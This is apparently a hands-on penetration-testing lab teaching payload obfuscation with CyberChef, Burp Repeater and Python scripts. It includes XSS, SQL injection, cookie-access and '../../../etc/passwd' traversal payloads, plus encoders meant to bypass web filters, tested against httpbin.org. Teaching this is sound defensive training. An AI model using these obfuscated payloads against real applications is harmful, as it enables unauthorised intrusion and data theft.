@@ -1,0 +1,725 @@
+Payload Obfuscation Using CyberChef & Burp
+Objectives
+By the end of this lab, students will be able to:
+
+Understand the fundamentals of payload obfuscation techniques
+Use CyberChef for encoding, encrypting, and transforming payloads
+Utilize Burp Suite Community Edition's Repeater tool for payload testing and manipulation
+Create Python scripts to automate payload obfuscation processes
+Apply various encoding methods to bypass web application filters
+Analyze and modify HTTP requests using Burp Suite tools
+Prerequisites
+Before starting this lab, students should have:
+
+Basic understanding of HTTP protocols and web application security
+Familiarity with Linux command line operations
+Basic knowledge of Python programming
+Understanding of web application penetration testing concepts
+Knowledge of common web vulnerabilities (XSS, SQL injection, etc.)
+Ready-to-Use Cloud Machines
+Al Nafi provides Linux-based cloud machines with all necessary tools pre-installed. Simply click Start Lab to access your dedicated environment. No need to build your own VM or install additional software.
+
+Lab Environment Setup
+Your cloud machine comes pre-configured with:
+
+CyberChef - Web-based data transformation tool
+Burp Suite Community Edition - Web application security testing platform
+Python 3 - Programming language for automation scripts
+Firefox Browser - For accessing web interfaces
+Text editors (nano, vim) - For script creation
+Task 1: Obfuscate Payloads Using CyberChef
+Subtask 1.1: Launch CyberChef and Understand the Interface
+Open a terminal window on your Linux machine
+
+Start CyberChef by running the following command:
+
+firefox https://gchq.github.io/CyberChef/
+Familiarize yourself with the CyberChef interface:
+Operations panel (left side): Contains all available transformation operations
+Recipe panel (middle): Where you drag and configure operations
+Input panel (bottom left): Where you enter your original payload
+Output panel (bottom right): Shows the transformed result
+Subtask 1.2: Basic Payload Encoding
+In the Input field, enter a basic XSS payload:
+<script>alert('XSS')</script>
+From the Operations panel, drag the following operations to the Recipe area:
+
+To Base64
+URL Encode
+Observe how the payload transforms in the Output panel
+
+The final obfuscated payload should look similar to:
+
+PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4%3D
+Document this transformation for later use
+Subtask 1.3: Advanced Obfuscation Techniques
+Clear the recipe and input a SQL injection payload:
+' OR 1=1 UNION SELECT username,password FROM users--
+Apply multiple obfuscation layers:
+
+Drag To Hex operation
+Add To Base64 operation
+Include URL Encode operation
+Record the final obfuscated payload
+
+Experiment with additional encoding methods:
+
+HTML Entity Encode
+To Charcode
+ROT13
+Subtask 1.4: Custom Obfuscation Recipe
+Create a custom obfuscation recipe for JavaScript payloads:
+
+Input the following payload:
+
+document.cookie
+Build a recipe using these operations in sequence:
+
+To Charcode (with space delimiter)
+Find/Replace (replace spaces with commas)
+To Base64
+URL Encode
+Save this recipe configuration for automation purposes
+
+Task 2: Use Burp Repeater to Test and Manipulate Payloads
+Subtask 2.1: Configure Burp Suite
+Launch Burp Suite Community Edition:
+java -jar /opt/burpsuite/burpsuite_community.jar
+Create a new temporary project and use Burp defaults
+
+Navigate to the Proxy tab and ensure the proxy is running on 127.0.0.1:8080
+
+Configure Firefox to use Burp proxy:
+
+Open Firefox preferences
+Search for "proxy"
+Select "Manual proxy configuration"
+Set HTTP proxy to 127.0.0.1 port 8080
+Check "Use this proxy server for all protocols"
+Subtask 2.2: Capture and Analyze HTTP Requests
+Create a simple HTML form for testing. Save this as test.html:
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Payload Testing Form</title>
+</head>
+<body>
+    <form method="POST" action="http://httpbin.org/post">
+        <label>Username:</label>
+        <input type="text" name="username" value="">
+        <br><br>
+        <label>Comment:</label>
+        <textarea name="comment"></textarea>
+        <br><br>
+        <input type="submit" value="Submit">
+    </form>
+</body>
+</html>
+Open the HTML file in Firefox:
+firefox test.html
+In Burp, go to Proxy > Intercept and ensure intercept is ON
+
+Fill the form with a test payload and submit:
+
+Username: admin
+Comment: <script>alert('test')</script>
+The request should be intercepted in Burp. Click Forward to send it
+
+Subtask 2.3: Use Burp Repeater for Payload Testing
+In Burp, navigate to Proxy > HTTP History
+
+Find your POST request and right-click it
+
+Select Send to Repeater
+
+Go to the Repeater tab
+
+In the request, locate the comment parameter and replace it with your CyberChef-obfuscated payload from Task 1
+
+Click Send to test the obfuscated payload
+
+Analyze the response to see if the obfuscation bypassed any filters
+
+Subtask 2.4: Payload Manipulation and Testing
+In Burp Repeater, experiment with different obfuscation levels:
+
+Test the original payload:
+
+comment=<script>alert('XSS')</script>
+Test the Base64 encoded version:
+comment=PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=
+Test the URL encoded version:
+comment=%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E
+Test double encoding:
+comment=%253Cscript%253Ealert%2528%2527XSS%2527%2529%253C%252Fscript%253E
+Document which payloads receive different responses
+Task 3: Automate Payload Obfuscation with Python Scripts
+Subtask 3.1: Create Basic Obfuscation Functions
+Create a new Python script called payload_obfuscator.py:
+nano payload_obfuscator.py
+Add the following code:
+#!/usr/bin/env python3
+import base64
+import urllib.parse
+import html
+import binascii
+
+class PayloadObfuscator:
+    def __init__(self):
+        self.original_payload = ""
+        self.obfuscated_payloads = {}
+    
+    def set_payload(self, payload):
+        """Set the original payload to obfuscate"""
+        self.original_payload = payload
+        self.obfuscated_payloads = {}
+    
+    def base64_encode(self):
+        """Encode payload using Base64"""
+        encoded = base64.b64encode(self.original_payload.encode()).decode()
+        self.obfuscated_payloads['base64'] = encoded
+        return encoded
+    
+    def url_encode(self):
+        """URL encode the payload"""
+        encoded = urllib.parse.quote(self.original_payload)
+        self.obfuscated_payloads['url'] = encoded
+        return encoded
+    
+    def double_url_encode(self):
+        """Double URL encode the payload"""
+        first_encode = urllib.parse.quote(self.original_payload)
+        double_encoded = urllib.parse.quote(first_encode)
+        self.obfuscated_payloads['double_url'] = double_encoded
+        return double_encoded
+    
+    def html_encode(self):
+        """HTML entity encode the payload"""
+        encoded = html.escape(self.original_payload)
+        self.obfuscated_payloads['html'] = encoded
+        return encoded
+    
+    def hex_encode(self):
+        """Convert payload to hexadecimal"""
+        encoded = binascii.hexlify(self.original_payload.encode()).decode()
+        self.obfuscated_payloads['hex'] = encoded
+        return encoded
+    
+    def char_code_encode(self):
+        """Convert to JavaScript character codes"""
+        char_codes = [str(ord(char)) for char in self.original_payload]
+        encoded = "String.fromCharCode(" + ",".join(char_codes) + ")"
+        self.obfuscated_payloads['charcode'] = encoded
+        return encoded
+    
+    def get_all_encodings(self):
+        """Generate all encoding variations"""
+        encodings = {}
+        encodings['original'] = self.original_payload
+        encodings['base64'] = self.base64_encode()
+        encodings['url'] = self.url_encode()
+        encodings['double_url'] = self.double_url_encode()
+        encodings['html'] = self.html_encode()
+        encodings['hex'] = self.hex_encode()
+        encodings['charcode'] = self.char_code_encode()
+        return encodings
+
+def main():
+    obfuscator = PayloadObfuscator()
+    
+    # Test payloads
+    test_payloads = [
+        "<script>alert('XSS')</script>",
+        "' OR 1=1 UNION SELECT * FROM users--",
+        "document.cookie",
+        "../../../etc/passwd"
+    ]
+    
+    for payload in test_payloads:
+        print(f"\n{'='*50}")
+        print(f"Original Payload: {payload}")
+        print(f"{'='*50}")
+        
+        obfuscator.set_payload(payload)
+        encodings = obfuscator.get_all_encodings()
+        
+        for encoding_type, encoded_payload in encodings.items():
+            print(f"{encoding_type.upper()}: {encoded_payload}")
+
+if __name__ == "__main__":
+    main()
+Save and exit the editor
+
+Make the script executable:
+
+chmod +x payload_obfuscator.py
+Run the script:
+python3 payload_obfuscator.py
+Subtask 3.2: Create Advanced Obfuscation Script
+Create an advanced script called advanced_obfuscator.py:
+nano advanced_obfuscator.py
+Add the following code:
+#!/usr/bin/env python3
+import base64
+import urllib.parse
+import html
+import binascii
+import json
+import random
+import string
+
+class AdvancedPayloadObfuscator:
+    def __init__(self):
+        self.payload = ""
+    
+    def set_payload(self, payload):
+        self.payload = payload
+    
+    def chain_encodings(self, encodings_list):
+        """Chain multiple encoding methods"""
+        result = self.payload
+        for encoding in encodings_list:
+            if encoding == 'base64':
+                result = base64.b64encode(result.encode()).decode()
+            elif encoding == 'url':
+                result = urllib.parse.quote(result)
+            elif encoding == 'html':
+                result = html.escape(result)
+            elif encoding == 'hex':
+                result = binascii.hexlify(result.encode()).decode()
+        return result
+    
+    def random_case_obfuscation(self):
+        """Randomly change case of characters"""
+        result = ""
+        for char in self.payload:
+            if char.isalpha():
+                result += char.upper() if random.choice([True, False]) else char.lower()
+            else:
+                result += char
+        return result
+    
+    def insert_random_comments(self):
+        """Insert random HTML/JS comments"""
+        if '<script>' in self.payload.lower():
+            # Insert comments in JavaScript
+            result = self.payload.replace('<script>', '<script>/*comment*/')
+            result = result.replace('</script>', '/*comment*/</script>')
+            return result
+        return self.payload
+    
+    def unicode_encode(self):
+        """Encode using Unicode escape sequences"""
+        result = ""
+        for char in self.payload:
+            if ord(char) > 127 or char in '<>"\'&':
+                result += f"\\u{ord(char):04x}"
+            else:
+                result += char
+        return result
+    
+    def generate_obfuscation_report(self):
+        """Generate comprehensive obfuscation report"""
+        report = {
+            'original': self.payload,
+            'single_encodings': {},
+            'chained_encodings': {},
+            'advanced_techniques': {}
+        }
+        
+        # Single encodings
+        report['single_encodings']['base64'] = base64.b64encode(self.payload.encode()).decode()
+        report['single_encodings']['url'] = urllib.parse.quote(self.payload)
+        report['single_encodings']['html'] = html.escape(self.payload)
+        report['single_encodings']['hex'] = binascii.hexlify(self.payload.encode()).decode()
+        
+        # Chained encodings
+        report['chained_encodings']['base64_url'] = self.chain_encodings(['base64', 'url'])
+        report['chained_encodings']['html_url'] = self.chain_encodings(['html', 'url'])
+        report['chained_encodings']['hex_base64'] = self.chain_encodings(['hex', 'base64'])
+        
+        # Advanced techniques
+        report['advanced_techniques']['random_case'] = self.random_case_obfuscation()
+        report['advanced_techniques']['with_comments'] = self.insert_random_comments()
+        report['advanced_techniques']['unicode'] = self.unicode_encode()
+        
+        return report
+
+def save_report_to_file(report, filename):
+    """Save obfuscation report to JSON file"""
+    with open(filename, 'w') as f:
+        json.dump(report, f, indent=2)
+    print(f"Report saved to {filename}")
+
+def main():
+    obfuscator = AdvancedPayloadObfuscator()
+    
+    # Interactive mode
+    print("Advanced Payload Obfuscator")
+    print("=" * 30)
+    
+    while True:
+        payload = input("\nEnter payload to obfuscate (or 'quit' to exit): ")
+        if payload.lower() == 'quit':
+            break
+        
+        obfuscator.set_payload(payload)
+        report = obfuscator.generate_obfuscation_report()
+        
+        print(f"\nObfuscation Report for: {payload}")
+        print("-" * 50)
+        
+        for category, methods in report.items():
+            if category == 'original':
+                continue
+            print(f"\n{category.upper().replace('_', ' ')}:")
+            if isinstance(methods, dict):
+                for method, result in methods.items():
+                    print(f"  {method}: {result}")
+            else:
+                print(f"  {methods}")
+        
+        # Save report option
+        save_option = input("\nSave report to file? (y/n): ")
+        if save_option.lower() == 'y':
+            filename = f"obfuscation_report_{hash(payload) % 10000}.json"
+            save_report_to_file(report, filename)
+
+if __name__ == "__main__":
+    main()
+Save and exit the editor
+
+Run the advanced script:
+
+python3 advanced_obfuscator.py
+Subtask 3.3: Create Burp Integration Script
+Create a script to generate payloads for Burp testing called burp_payload_generator.py:
+nano burp_payload_generator.py
+Add the following code:
+#!/usr/bin/env python3
+import base64
+import urllib.parse
+import html
+import sys
+
+def generate_burp_payloads(original_payload):
+    """Generate various obfuscated payloads for Burp testing"""
+    
+    payloads = []
+    
+    # Original payload
+    payloads.append(("Original", original_payload))
+    
+    # Base64 encoding
+    base64_payload = base64.b64encode(original_payload.encode()).decode()
+    payloads.append(("Base64", base64_payload))
+    
+    # URL encoding
+    url_payload = urllib.parse.quote(original_payload)
+    payloads.append(("URL Encoded", url_payload))
+    
+    # Double URL encoding
+    double_url_payload = urllib.parse.quote(urllib.parse.quote(original_payload))
+    payloads.append(("Double URL Encoded", double_url_payload))
+    
+    # HTML entity encoding
+    html_payload = html.escape(original_payload)
+    payloads.append(("HTML Encoded", html_payload))
+    
+    # Mixed case (for case-insensitive filters)
+    mixed_case_payload = ""
+    for i, char in enumerate(original_payload):
+        if char.isalpha():
+            mixed_case_payload += char.upper() if i % 2 == 0 else char.lower()
+        else:
+            mixed_case_payload += char
+    payloads.append(("Mixed Case", mixed_case_payload))
+    
+    # Character code representation
+    char_codes = [str(ord(char)) for char in original_payload]
+    charcode_payload = "String.fromCharCode(" + ",".join(char_codes) + ")"
+    payloads.append(("Character Codes", charcode_payload))
+    
+    return payloads
+
+def create_burp_request_template(payloads, target_url="http://httpbin.org/post"):
+    """Create HTTP request templates for Burp Repeater"""
+    
+    print("HTTP Request Templates for Burp Repeater:")
+    print("=" * 50)
+    
+    for name, payload in payloads:
+        print(f"\n--- {name} ---")
+        request_template = f"""POST /post HTTP/1.1
+Host: httpbin.org
+Content-Type: application/x-www-form-urlencoded
+Content-Length: {len(f'comment={payload}')}
+
+comment={payload}"""
+        print(request_template)
+        print("-" * 30)
+
+def main():
+    if len(sys.argv) != 2:
+        print("Usage: python3 burp_payload_generator.py '<payload>'")
+        print("Example: python3 burp_payload_generator.py '<script>alert(1)</script>'")
+        sys.exit(1)
+    
+    original_payload = sys.argv[1]
+    payloads = generate_burp_payloads(original_payload)
+    
+    print(f"Generated {len(payloads)} payload variations:")
+    print("=" * 50)
+    
+    for name, payload in payloads:
+        print(f"{name}: {payload}")
+    
+    print("\n")
+    create_burp_request_template(payloads)
+    
+    # Save to file
+    with open("burp_payloads.txt", "w") as f:
+        f.write(f"Payload variations for: {original_payload}\n")
+        f.write("=" * 50 + "\n\n")
+        for name, payload in payloads:
+            f.write(f"{name}: {payload}\n")
+    
+    print(f"\nPayloads saved to burp_payloads.txt")
+
+if __name__ == "__main__":
+    main()
+Save and exit the editor
+
+Test the script with a sample payload:
+
+python3 burp_payload_generator.py "<script>alert('XSS')</script>"
+Subtask 3.4: Automated Testing Integration
+Create a comprehensive testing script called automated_payload_tester.py:
+nano automated_payload_tester.py
+Add the following code:
+#!/usr/bin/env python3
+import requests
+import base64
+import urllib.parse
+import html
+import time
+import json
+from datetime import datetime
+
+class AutomatedPayloadTester:
+    def __init__(self, target_url):
+        self.target_url = target_url
+        self.session = requests.Session()
+        self.results = []
+    
+    def generate_payloads(self, original_payload):
+        """Generate various obfuscated payloads"""
+        payloads = {
+            'original': original_payload,
+            'base64': base64.b64encode(original_payload.encode()).decode(),
+            'url_encoded': urllib.parse.quote(original_payload),
+            'double_url_encoded': urllib.parse.quote(urllib.parse.quote(original_payload)),
+            'html_encoded': html.escape(original_payload),
+            'mixed_case': self.mixed_case_transform(original_payload),
+            'with_null_bytes': original_payload.replace('<', '<\x00'),
+            'unicode_encoded': self.unicode_encode(original_payload)
+        }
+        return payloads
+    
+    def mixed_case_transform(self, payload):
+        """Transform payload to mixed case"""
+        result = ""
+        for i, char in enumerate(payload):
+            if char.isalpha():
+                result += char.upper() if i % 2 == 0 else char.lower()
+            else:
+                result += char
+        return result
+    
+    def unicode_encode(self, payload):
+        """Encode special characters as Unicode"""
+        result = ""
+        for char in payload:
+            if char in '<>"\'&':
+                result += f"\\u{ord(char):04x}"
+            else:
+                result += char
+        return result
+    
+    def test_payload(self, payload_name, payload_value):
+        """Test a single payload against the target"""
+        try:
+            data = {'comment': payload_value, 'username': 'testuser'}
+            
+            start_time = time.time()
+            response = self.session.post(self.target_url, data=data, timeout=10)
+            end_time = time.time()
+            
+            result = {
+                'payload_name': payload_name,
+                'payload_value': payload_value,
+                'status_code': response.status_code,
+                'response_time': round(end_time - start_time, 3),
+                'response_length': len(response.text),
+                'timestamp': datetime.now().isoformat(),
+                'reflected': payload_value in response.text,
+                'error_detected': any(error in response.text.lower() 
+                                    for error in ['error', 'exception', 'warning'])
+            }
+            
+            self.results.append(result)
+            return result
+            
+        except requests.exceptions.RequestException as e:
+            error_result = {
+                'payload_name': payload_name,
+                'payload_value': payload_value,
+                'error': str(e),
+                'timestamp': datetime.now().isoformat()
+            }
+            self.results.append(error_result)
+            return error_result
+    
+    def run_test_suite(self, original_payload):
+        """Run complete test suite with all payload variations"""
+        print(f"Starting automated payload testing...")
+        print(f"Target URL: {self.target_url}")
+        print(f"Original Payload: {original_payload}")
+        print("=" * 60)
+        
+        payloads = self.generate_payloads(original_payload)
+        
+        for payload_name, payload_value in payloads.items():
+            print(f"Testing {payload_name}...")
+            result = self.test_payload(payload_name, payload_value)
+            
+            if 'error' not in result:
+                status = "SUCCESS" if result['status_code'] == 200 else "FAILED"
+                reflected = "REFLECTED" if result['reflected'] else "NOT REFLECTED"
+                print(f"  Status: {status} | Response Time: {result['response_time']}s | {reflected}")
+            else:
+                print(f"  ERROR: {result['error']}")
+            
+            time.sleep(1)  # Be respectful to the target
+        
+        print("\nTest completed!")
+        return self.results
+    
+    def generate_report(self, filename="payload_test_report.json"):
+        """Generate detailed test report"""
+        report = {
+            'test_summary': {
+                'target_url': self.target_url,
+                'total_tests': len(self.results),
+                'successful_tests': len([r for r in self.results if 'error' not in r]),
+                'failed_tests': len([r for r in self.results if 'error' in r]),
+                'reflected_payloads': len([r for r in self.results if r.get('reflected', False)]),
+                'timestamp': datetime.now().isoformat()
+            },
+            'detailed_results': self.results
+        }
+        
+        with open(filename, 'w') as f:
+            json.dump(report, f, indent=2)
+        
+        print(f"Detailed report saved to {filename}")
+        return report
+
+def main():
+    # Use httpbin.org for safe testing
+    target_url = "http://httpbin.org/post"
+    
+    # Test payloads
+    test_payloads = [
+        "<script>alert('XSS')</script>",
+        "' OR 1=1--",
+        "document.cookie",
+        "<img src=x onerror=alert(1)>"
+    ]
+    
+    for payload in test_payloads:
+        print(f"\n{'='*80}")
+        print(f"Testing payload: {payload}")
+        print(f"{'='*80}")
+        
+        tester = AutomatedPayloadTester(target_url)
+        results = tester.run_test_suite(payload)
+        
+        # Generate report
+        report_filename = f"report_{hash(payload) % 10000}.json"
+        tester.generate_report(report_filename)
+        
+        print(f"\nSummary for '{payload}':")
+        successful = len([r for r in results if 'error' not in r])
+        reflected = len([r for r in results if r.get('reflected', False)])
+        print(f"  Successful tests: {successful}/{len(results)}")
+        print(f"  Reflected payloads: {reflected}")
+
+if __name__ == "__main__":
+    main()
+Save and exit the editor
+
+Run the automated tester:
+
+python3 automated_payload_tester.py
+Verification and Testing
+Verify CyberChef Integration
+Open CyberChef in your browser and test the following recipe:
+
+Input: <script>alert(1)</script>
+Operations: To Base64 → URL Encode
+Expected output should be URL-encoded Base64
+Verify the output matches your Python script results
+
+Verify Burp Suite Integration
+Launch Burp Suite and configure proxy settings
+
+Use the generated HTTP request templates from your Python script
+
+Test each obfuscated payload in Burp Repeater
+
+Compare responses to identify which obfuscation methods are most effective
+
+Verify Python Automation
+Run all three Python scripts and verify they execute without errors
+
+Check that output files are created correctly
+
+Verify JSON reports contain expected data structures
+
+Troubleshooting Common Issues
+CyberChef Issues
+Problem: CyberChef not loading
+Solution: Check internet connection or use local CyberChef installation
+Burp Suite Issues
+Problem: Proxy not intercepting requests
+Solution: Verify Firefox proxy settings and ensure Burp proxy is running
+Python Script Issues
+Problem: Module import errors
+Solution: Ensure all required Python modules are installed:
+pip3 install requests
+Network Issues
+Problem: Cannot reach httpbin.org
+Solution: Check internet connectivity or use alternative testing endpoints
+Key Concepts Summary
+Payload Obfuscation Techniques
+Encoding: Base64, URL, HTML entity encoding
+Case Manipulation: Mixed case, uppercase/lowercase variations
+Character Representation: Unicode, character codes, hex encoding
+Layered Obfuscation: Combining multiple encoding methods
+Security Testing Methodology
+Systematic Testing: Testing multiple payload variations
+Response Analysis: Examining server responses for filtering behavior
+Automation Benefits: Consistent testing and comprehensive coverage
+Documentation: Maintaining detailed records of test results
+Conclusion
+In this lab, you have successfully learned to:
+
+Master CyberChef: Used the powerful web-based tool to create complex payload obfuscation recipes using various encoding and transformation techniques
+Leverage Burp Suite: Utilized Burp Repeater to systematically test obfuscated payloads against web applications and analyze server responses
+Automate Obfuscation: Created comprehensive Python scripts that generate multiple payload variations automatically, saving time and ensuring consistency
+Integrate Tools: Combined CyberChef, Burp Suite, and custom Python scripts into a cohesive testing workflow
+Analyze Results: Developed skills to interpret test results and identify which obfuscation techniques are most effective against different types of filters
+These skills are essential for modern web application penetration testing, as they enable you to bypass various security controls and filters that applications implement to prevent malicious input. The automation techniques you've learned will significantly improve your efficiency during security assessments and help ensure comprehensive testing coverage.
+
+The combination of manual testing with CyberChef and Burp Suite, along with automated Python scripts, provides a robust foundation for advanced payload obfuscation techniques used in professional penetration testing engagements.
